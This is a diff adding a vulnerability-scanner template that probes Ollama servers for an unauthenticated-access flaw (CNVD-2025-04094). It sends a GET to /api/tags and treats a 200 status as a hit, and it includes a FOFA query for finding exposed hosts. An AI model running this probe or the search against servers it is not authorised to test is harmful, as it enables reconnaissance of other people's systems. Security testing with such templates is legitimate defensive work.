@@ -1,0 +1,25 @@
+id: poc-ikpq5re2i1egr2uz
+info:
+  name: OLLAMA tags 存在未授权访问漏洞（CNVD-2025-04094）
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ikpq5re2i1egr2uz'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ikpq5re2i1egr2uz
+    fofa: app="Ollama"
+http:
+- raw:
+  - 'GET /api/tags HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Referer: [https://www.baidu.com](https://www.baidu.com)
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
